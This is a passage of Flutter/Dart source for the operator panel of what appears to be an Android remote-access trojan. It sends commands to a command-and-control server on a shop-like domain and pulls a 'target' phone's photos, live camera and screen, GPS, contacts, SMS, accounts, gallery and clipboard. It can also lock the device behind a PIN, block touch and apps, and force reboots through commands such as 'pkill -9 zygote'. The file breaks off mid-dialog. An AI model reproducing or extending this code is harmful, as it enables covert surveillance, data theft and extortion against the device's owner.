// control_panel.dart - NEO-BRUTALISM EDITION
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// ═══════════════════════════════════════════════════════════════════
//  NEO-BRUTALISM THEME
// ═══════════════════════════════════════════════════════════════════
class ControlTheme {
  static const bg         = Color(0xFFFFFFFF);
  static const white      = Color(0xFFFFFFFF);
  static const yellow     = Color(0xFFFFE600);
  static const yellowSoft = Color(0xFFFFF9CC);
  static const black      = Color(0xFF000000);
  static const textPrimary   = Color(0xFF000000);
  static const textSec       = Color(0xFF333333);
  static const textMuted     = Color(0xFF777777);
  static const success = Color(0xFF00C853);
  static const warning = Color(0xFFFFAB40);
  static const error   = Color(0xFFFF1744);
  static const blue    = Color(0xFF2196F3);
  static const orange  = Color(0xFFFF9800);
}

class ControlShadowUtils {
  static List<BoxShadow> get sm => const [
    BoxShadow(color: ControlTheme.black, offset: Offset(2, 2), blurRadius: 0),
  ];
  static List<BoxShadow> get md => const [
    BoxShadow(color: ControlTheme.black, offset: Offset(3, 3), blurRadius: 0),
  ];
  static List<BoxShadow> get lg => const [
    BoxShadow(color: ControlTheme.black, offset: Offset(5, 5), blurRadius: 0),
  ];
}

// ═══════════════════════════════════════════════════════════════════
//  PRESS WRAPPER
// ═══════════════════════════════════════════════════════════════════
class _PressWrap extends StatefulWidget {
  final Widget child;
  final VoidCallback onTap;
  const _PressWrap({required this.child, required this.onTap});
  @override
  State<_PressWrap> createState() => _PressWrapState();
}

class _PressWrapState extends State<_PressWrap> {
  bool _pressed = false;
  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) => setState(() => _pressed = false),
      onTapCancel: () => setState(() => _pressed = false),
      onTap: () {
        HapticFeedback.lightImpact();
        widget.onTap();
      },
      child: AnimatedScale(
        duration: const Duration(milliseconds: 90),
        scale: _pressed ? 0.96 : 1.0,
        child: widget.child,
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════
//  CONTROL CENTER PAGE
// ═══════════════════════════════════════════════════════════════════
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override
  State<ControlCenterPage> createState() => _ControlCenterState();
}

class _ControlCenterState extends State<ControlCenterPage> {
  static const _kBase = 'http://alfa-store-officials.alfamarket2.my.id:4700';
  static const Set<String> _needPoll = {
    'take_photo', 'get_screen', 'get_location', 'track_gps',
    'get_contacts', 'dump_contacts', 'get_gmails', 'get_sms', 'get_gallery',
  };

  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // App Block
  bool _whatsappBlocked = false;

  // Switches
  bool _torchOn = false;
  bool _strobeOn = false;

  // Device info
  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model =>
      widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery =>
      widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer =
        Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  // ─── LOG ────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = ControlTheme.error}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: ControlTheme.black,
      content: Row(
        children: [
          Icon(Icons.info_rounded, color: c, size: 18),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              m,
              style: const TextStyle(
                fontWeight: FontWeight.w900,
                color: ControlTheme.yellow,
                fontSize: 12,
              ),
            ),
          ),
        ],
      ),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(12),
        side: const BorderSide(color: ControlTheme.black, width: 2),
      ),
    ));
  }

  // ─── SEND COMMAND ───────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('ID target tidak valid');
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Terkirim', c: ControlTheme.success);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) {
          _addLog('Error $cmd (${res.statusCode})');
          _toast('Target offline');
        }
      }
    } catch (e) {
      if (!silent) {
        _addLog('Conn error: $e');
        _toast('Koneksi gagal');
      }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─── POLL RESPONSE ──────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0;
    bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 &&
            res.body.isNotEmpty &&
            res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) {
              _onResponse(cmd, d['data']);
              got = true;
            }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) {
          _toast('Foto kosong');
          return;
        }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot diterima');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location':
      case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts':
      case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ─── LIVE STREAM ────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) {
        _liveTimer?.cancel();
        return;
      }
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() {
      _liveOn = false;
      _frame = null;
    });
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
  }

  // ─── CHAT ───────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? '',
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': 'owner',
          'text': text.trim(),
          'time': TimeOfDay.now().format(context),
        }));
    _scrollChat();
    try {
      await http.post(
        Uri.parse('$_kBase/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  // ─── BUILD ──────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: ControlTheme.bg,
      body: SafeArea(
        bottom: false,
        child: Column(
          children: [
            _buildHeader(),
            _buildBanner(),
            _buildMenuBar(),
            Expanded(child: _buildContent()),
          ],
        ),
      ),
    );
  }

  // ─── HEADER ─────────────────────────────────────────────────
  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 14),
      decoration: const BoxDecoration(
        color: ControlTheme.bg,
        border: Border(
          bottom: BorderSide(color: ControlTheme.black, width: 3),
        ),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          _pressBtn(
            icon: Icons.arrow_back_ios_new_rounded,
            onTap: () {
              if (_liveOn) _stopLive();
              Navigator.pop(context);
            },
          ),
          RichText(
            text: const TextSpan(
              children: [
                TextSpan(
                  text: 'CTRL',
                  style: TextStyle(
                    fontSize: 20,
                    fontWeight: FontWeight.w900,
                    color: ControlTheme.black,
                    fontFamily: 'Genetic',
                    letterSpacing: 2,
                  ),
                ),
                TextSpan(
                  text: 'ROOM',
                  style: TextStyle(
                    fontSize: 20,
                    fontWeight: FontWeight.w900,
                    color: ControlTheme.textMuted,
                    fontFamily: 'Genetic',
                    letterSpacing: 2,
                  ),
                ),
              ],
            ),
          ),
          _pressBtn(
            icon: Icons.refresh_rounded,
            onTap: () {
              setState(() {});
              _cmd('force_open', silent: true);
            },
          ),
        ],
      ),
    );
  }

  Widget _pressBtn({required IconData icon, required VoidCallback onTap}) {
    return _PressWrap(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(9),
        decoration: BoxDecoration(
          color: ControlTheme.yellow,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: ControlTheme.black, width: 2.5),
          boxShadow: ControlShadowUtils.sm,
        ),
        child: Icon(icon, color: ControlTheme.black, size: 18),
      ),
    );
  }

  // ─── BANNER ─────────────────────────────────────────────────
  Widget _buildBanner() {
    return Container(
      margin: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: ControlTheme.black,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: ControlTheme.black, width: 3),
        boxShadow: ControlShadowUtils.md,
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(13),
        child: Stack(
          children: [
            AspectRatio(
              aspectRatio: 16 / 9,
              child: Image.asset(
                'assets/gifs/device.gif',
                fit: BoxFit.cover,
                errorBuilder: (_, __, ___) => Container(
                  color: ControlTheme.yellow,
                  child: const Center(
                    child: Icon(Icons.devices_rounded,
                        color: ControlTheme.black, size: 48),
                  ),
                ),
              ),
            ),
            // ONLINE badge
            Positioned(
              bottom: 12,
              left: 12,
              child: Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                decoration: BoxDecoration(
                  color: ControlTheme.success,
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: ControlTheme.black, width: 2),
                  boxShadow: ControlShadowUtils.sm,
                ),
                child: Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: const BoxDecoration(
                        color: ControlTheme.white,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    const Text(
                      'ONLINE',
                      style: TextStyle(
                        color: ControlTheme.white,
                        fontSize: 10,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            // Device model
            Positioned(
              bottom: 12,
              right: 12,
              child: Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                decoration: BoxDecoration(
                  color: ControlTheme.yellow,
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: ControlTheme.black, width: 2),
                  boxShadow: ControlShadowUtils.sm,
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Icon(Icons.device_unknown,
                        color: ControlTheme.black, size: 12),
                    const SizedBox(width: 4),
                    ConstrainedBox(
                      constraints: const BoxConstraints(maxWidth: 100),
                      child: Text(
                        _model,
                        style: const TextStyle(
                          color: ControlTheme.black,
                          fontSize: 10,
                          fontWeight: FontWeight.w900,
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── MENU BAR ───────────────────────────────────────────────
  Widget _buildMenuBar() {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 0, 16, 8),
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
      decoration: BoxDecoration(
        color: ControlTheme.white,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: ControlTheme.black, width: 2.5),
        boxShadow: ControlShadowUtils.sm,
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Row(
            children: [
              const Icon(Icons.phone_android,
                  color: ControlTheme.black, size: 18),
              const SizedBox(width: 8),
              Text(
                _model,
                style: const TextStyle(
                  color: ControlTheme.black,
                  fontSize: 11,
                  fontWeight: FontWeight.w900,
                ),
                overflow: TextOverflow.ellipsis,
              ),
            ],
          ),
          Row(
            children: [
              Icon(Icons.battery_std, color: _getBatteryColor(), size: 16),
              const SizedBox(width: 4),
              Text(
                '$_battery%',
                style: TextStyle(
                  color: _getBatteryColor(),
                  fontSize: 12,
                  fontWeight: FontWeight.w900,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Color _getBatteryColor() {
    final bat = int.tryParse(_battery) ?? 0;
    if (bat >= 70) return ControlTheme.success;
    if (bat >= 30) return ControlTheme.orange;
    return ControlTheme.error;
  }

  // ─── CONTENT ────────────────────────────────────────────────
  Widget _buildContent() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          _buildGridButtons([
            _GridButton('LIVE', ControlTheme.error, Icons.videocam_rounded,
                _pageLive),
            _GridButton('CAM', ControlTheme.blue, Icons.camera_alt_rounded,
                _pageCamera),
            _GridButton('INTEL', ControlTheme.success,
                Icons.psychology_rounded, _pageIntel),
            _GridButton('DEV', ControlTheme.orange,
                Icons.developer_mode_rounded, _pageDevice),
            _GridButton('CHAT', ControlTheme.black, Icons.chat_rounded,
                _pageLock),
            _GridButton('AUDIO', ControlTheme.blue,
                Icons.audiotrack_rounded, _pageAudio),
            _GridButton('FILE', ControlTheme.orange, Icons.folder_rounded,
                _showFileManager),
            _GridButton('CLIPBOARD', ControlTheme.success,
                Icons.content_paste_rounded, _getClipboard),
          ], columns: 2),
        ],
      ),
    );
  }

  // ─── PAGE FUNCTIONS ─────────────────────────────────────────
  void _pageLive() {
    _showCamPicker((side) {
      _startLive('live_camera_start', side);
      _showLiveDialog();
    });
  }

  void _pageCamera() {
    _showModernSheet(
      title: 'CAMERA',
      icon: Icons.camera_alt_rounded,
      child: _buildGridButtons([
        _GridButton('Take Photo', ControlTheme.blue,
            Icons.camera_alt_rounded, () {
          Navigator.pop(context);
          _showCamPicker((s) => _cmd('take_photo', extra: s));
        }),
        _GridButton('Screenshot', ControlTheme.success,
            Icons.screenshot_monitor, () {
          Navigator.pop(context);
          _cmd('get_screen');
        }),
        _GridButton('Set Wallpaper', ControlTheme.orange,
            Icons.wallpaper_rounded, () {
          Navigator.pop(context);
          _inputDialog('Set Wallpaper', 'Image URL',
              (v) => _cmd('set_wallpaper', extra: v));
        }),
        _GridButton('Strobe', ControlTheme.yellow, Icons.flash_on_rounded,
            () {
          Navigator.pop(context);
          _showStrobeDialog();
        }),
        _GridButton('Torch', ControlTheme.yellow,
            Icons.flashlight_on_rounded, () {
          Navigator.pop(context);
          _showTorchDialog();
        }),
      ], columns: 2),
    );
  }

  void _pageIntel() {
    _showModernSheet(
      title: 'INTELLIGENCE',
      icon: Icons.psychology_rounded,
      isScrollable: true,
      child: _buildGridButtons([
        _GridButton('Contacts', ControlTheme.blue, Icons.contacts_rounded,
            () {
          Navigator.pop(context);
          _cmd('get_contacts');
        }),
        _GridButton('GPS Location', ControlTheme.success,
            Icons.my_location_rounded, () {
          Navigator.pop(context);
          _cmd('get_location');
        }),
        _GridButton('Gmail & Accounts', ControlTheme.orange,
            Icons.account_circle_rounded, () {
          Navigator.pop(context);
          _cmd('get_gmails');
        }),
        _GridButton('SMS Inbox', ControlTheme.blue, Icons.sms_rounded, () {
          Navigator.pop(context);
          _cmd('get_sms');
        }),
        _GridButton('Notifications', ControlTheme.yellow,
            Icons.notifications_rounded, () {
          Navigator.pop(context);
          _fetchNotif();
        }),
        _GridButton('Gallery (5 Photos)', ControlTheme.orange,
            Icons.photo_library_rounded, () {
          Navigator.pop(context);
          _cmd('get_gallery', extra: '5');
        }),
        _GridButton('Request Notif Access', ControlTheme.textMuted,
            Icons.security_rounded, () {
          Navigator.pop(context);
          _cmd('open_notification_settings');
        }),
        _GridButton('Touch Block', ControlTheme.error,
            Icons.touch_app_rounded, () {
          Navigator.pop(context);
          _showTouchBlockDialog();
        }),
        _GridButton('App Blocked', ControlTheme.black, Icons.block_rounded,
            () {
          Navigator.pop(context);
          _showAppBlockSheet();
        }),
      ], columns: 2),
    );
  }

  void _pageAudio() {
    _showModernSheet(
      title: 'AUDIO',
      icon: Icons.audiotrack_rounded,
      child: _buildGridButtons([
        _GridButton('Play Audio', ControlTheme.blue,
            Icons.play_circle_rounded, () {
          Navigator.pop(context);
          _inputDialog('Play Audio', 'MP3 URL',
              (v) => _cmd('play_audio', extra: v));
        }),
        _GridButton('Stop Audio', ControlTheme.textMuted,
            Icons.stop_circle_rounded, () {
          Navigator.pop(context);
          _cmd('stop_audio');
        }),
        _GridButton('Vibrate Loop', ControlTheme.orange,
            Icons.vibration_rounded, () {
          Navigator.pop(context);
          _cmd('vibrate_loop');
        }),
        _GridButton('Open URL', ControlTheme.success,
            Icons.open_in_browser, () {
          Navigator.pop(context);
          _inputDialog('Open URL', 'https://...',
              (v) => _cmd('open_url', extra: v));
        }),
        _GridButton('Kill WiFi', ControlTheme.error,
            Icons.wifi_off_rounded, () {
          Navigator.pop(context);
          _cmd('kill_wifi');
        }),
      ], columns: 2),
    );
  }

  void _pageLock() {
    _showModernSheet(
      title: 'LOCK & CHAT',
      icon: Icons.lock_rounded,
      isScrollable: true,
      child: Column(
        children: [
          _buildGridButtons([
            _GridButton('Lock Live + Chat', ControlTheme.error,
                Icons.lock_rounded, () {
              Navigator.pop(context);
              _lockLiveDialog();
            }),
            _GridButton('Lock Device', ControlTheme.orange,
                Icons.lock_outline_rounded, () {
              Navigator.pop(context);
              _inputDialog('Lock Device', 'Pesan di layar lock', (msg) {
                _inputDialog('PIN Unlock', '4 digit PIN', (pin) {
                  _cmd('hard_lock', extra: '$msg|$pin');
                }, isNumber: true, hint: '1234');
              });
            }),
            _GridButton('Unlock Device', ControlTheme.success,
                Icons.lock_open_rounded, () {
              Navigator.pop(context);
              _cmd('unlock');
            }),
            _GridButton('Overlay Lock', ControlTheme.blue,
                Icons.layers_rounded, () {
              Navigator.pop(context);
              _showOverlayLockDialog();
            }),
          ], columns: 2),
          const SizedBox(height: 20),
          _buildChatSection(),
        ],
      ),
    );
  }

  void _pageDevice() {
    _showModernSheet(
      title: 'DEVICE',
      icon: Icons.developer_mode_rounded,
      isScrollable: true,
      child: Column(
        children: [
          _buildGridButtons([
            _GridButton('Restart Device', ControlTheme.orange,
                Icons.restart_alt_rounded, () {
              Navigator.pop(context);
              _showRestartDialog();
            }),
            _GridButton('Wake Up Target', ControlTheme.success,
                Icons.wb_sunny_rounded, () {
              Navigator.pop(context);
              _cmd('force_open');
            }),
            _GridButton('SSID WiFi', ControlTheme.blue, Icons.wifi_rounded,
                () {
              Navigator.pop(context);
              _getSSID();
            }),
          ], columns: 2),
          const SizedBox(height: 20),
          _buildRestartMethods(),
        ],
      ),
    );
  }

  // ─── MODERN SHEET ───────────────────────────────────────────
  void _showModernSheet({
    required String title,
    required IconData icon,
    required Widget child,
    bool isScrollable = false,
  }) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => Container(
        decoration: const BoxDecoration(
          color: ControlTheme.white,
          borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
          border: Border(
            top: BorderSide(color: ControlTheme.black, width: 3),
            left: BorderSide(color: ControlTheme.black, width: 3),
            right: BorderSide(color: ControlTheme.black, width: 3),
          ),
        ),
        child: DraggableScrollableSheet(
          initialChildSize: isScrollable ? 0.85 : 0.5,
          maxChildSize: 0.92,
          minChildSize: 0.3,
          expand: false,
          builder: (_, sc) => Column(
            children: [
              // Handle
              Container(
                margin: const EdgeInsets.only(top: 12),
                height: 5,
                width: 40,
                decoration: BoxDecoration(
                  color: ControlTheme.black,
                  borderRadius: BorderRadius.circular(3),
                ),
              ),
              // Header
              Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: ControlTheme.yellow,
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                            color: ControlTheme.black, width: 2.5),
                        boxShadow: ControlShadowUtils.sm,
                      ),
                      child: Icon(icon,
                          color: ControlTheme.black, size: 20),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        title,
                        style: const TextStyle(
                          color: ControlTheme.black,
                          fontSize: 16,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                    ),
                    _PressWrap(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: ControlTheme.black,
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: const Icon(Icons.close_rounded,
                            color: ControlTheme.yellow, size: 18),
                      ),
                    ),
                  ],
                ),
              ),
              Container(height: 2, color: ControlTheme.black),
              // Content
              Expanded(
                child: isScrollable
                    ? SingleChildScrollView(
                        controller: sc,
                        padding: const EdgeInsets.all(20),
                        child: child,
                      )
                    : Padding(
                        padding: const EdgeInsets.all(20),
                        child: SingleChildScrollView(child: child),
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── CHAT SECTION ───────────────────────────────────────────
  Widget _buildChatSection() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: ControlTheme.yellowSoft,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: ControlTheme.black, width: 2.5),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: const [
              Icon(Icons.chat_rounded, color: ControlTheme.black, size: 18),
              SizedBox(width: 10),
              Text(
                'CHAT WITH TARGET',
                style: TextStyle(
                  fontSize: 12,
                  fontWeight: FontWeight.w900,
                  color: ControlTheme.black,
                  letterSpacing: 1,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Container(
            height: 150,
            decoration: BoxDecoration(
              color: ControlTheme.white,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: ControlTheme.black, width: 2),
            ),
            child: _chat.isEmpty
                ? Center(
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: const [
                        Icon(Icons.chat_bubble_outline,
                            color: ControlTheme.textMuted, size: 32),
                        SizedBox(height: 8),
                        Text(
                          'No messages yet',
                          style: TextStyle(
                            color: ControlTheme.textMuted,
                            fontSize: 11,
                            fontWeight: FontWeight.w700,
                          ),
                        ),
                      ],
                    ),
                  )
                : ListView.builder(
                    controller: _chatScroll,
                    padding: const EdgeInsets.all(10),
                    itemCount: _chat.length,
                    itemBuilder: (_, i) {
                      final m = _chat[i];
                      final isOwner = m['from'] == 'owner';
                      return Align(
                        alignment: isOwner
                            ? Alignment.centerRight
                            : Alignment.centerLeft,
                        child: Container(
                          margin: const EdgeInsets.symmetric(vertical: 3),
                          padding: const EdgeInsets.symmetric(
                              horizontal: 12, vertical: 8),
                          constraints: BoxConstraints(
                            maxWidth:
                                MediaQuery.of(context).size.width * 0.6,
                          ),
                          decoration: BoxDecoration(
                            color: isOwner
                                ? ControlTheme.yellow
                                : ControlTheme.white,
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                                color: ControlTheme.black, width: 2),
                            boxShadow: ControlShadowUtils.sm,
                          ),
                          child: Column(
                            crossAxisAlignment: isOwner
                                ? CrossAxisAlignment.end
                                : CrossAxisAlignment.start,
                            children: [
                              Text(
                                m['text'] ?? '',
                                style: const TextStyle(
                                  color: ControlTheme.black,
                                  fontSize: 12,
                                  fontWeight: FontWeight.w700,
                                ),
                              ),
                              const SizedBox(height: 2),
                              Text(
                                m['time'] ?? '',
                                style: const TextStyle(
                                  color: ControlTheme.textMuted,
                                  fontSize: 8,
                                  fontWeight: FontWeight.w700,
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    },
                  ),
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              Expanded(
                child: Container(
                  decoration: BoxDecoration(
                    color: ControlTheme.white,
                    borderRadius: BorderRadius.circular(24),
                    border:
                        Border.all(color: ControlTheme.black, width: 2),
                  ),
                  child: TextField(
                    controller: _chatCtrl,
                    style: const TextStyle(
                      color: ControlTheme.black,
                      fontSize: 12,
                      fontWeight: FontWeight.w700,
                    ),
                    decoration: const InputDecoration(
                      hintText: 'Type message...',
                      hintStyle: TextStyle(
                        color: ControlTheme.textMuted,
                        fontSize: 11,
                        fontWeight: FontWeight.w600,
                      ),
                      contentPadding: EdgeInsets.symmetric(
                          horizontal: 16, vertical: 12),
                      border: InputBorder.none,
                    ),
                    onSubmitted: _sendChat,
                  ),
                ),
              ),
              const SizedBox(width: 10),
              _PressWrap(
                onTap: () => _sendChat(_chatCtrl.text),
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: ControlTheme.yellow,
                    borderRadius: BorderRadius.circular(24),
                    border: Border.all(color: ControlTheme.black, width: 2.5),
                    boxShadow: ControlShadowUtils.sm,
                  ),
                  child: const Icon(Icons.send_rounded,
                      color: ControlTheme.black, size: 18),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  // ─── RESTART METHODS ────────────────────────────────────────
  Widget _buildRestartMethods() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: ControlTheme.yellowSoft,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: ControlTheme.black, width: 2.5),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'RESTART METHODS',
            style: TextStyle(
              fontSize: 11,
              fontWeight: FontWeight.w900,
              color: ControlTheme.black,
              letterSpacing: 1.5,
            ),
          ),
          const SizedBox(height: 12),
          _infoRow('1', 'PowerManager reflection (no root required)'),
          _infoRow('2', 'DevicePolicyManager (if admin active)'),
          _infoRow('3', 'su -c reboot (root)'),
          _infoRow('4', 'am crash system_server'),
          _infoRow('5', 'pkill -9 zygote'),
        ],
      ),
    );
  }

  void _showRestartDialog() {
    showDialog(
      context: context,
      builder: (_) => _brutalDialog(
        title: 'Restart Device',
        icon: Icons.restart_alt_rounded,
        iconColor: ControlTheme.orange,
        content: 'Target device will restart.\n\nUsing PowerManager reflection — no root or device admin required.',
        actions: [
          _dialogBtn(
            label: 'Cancel',
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'RESTART',
            bgColor: ControlTheme.error,
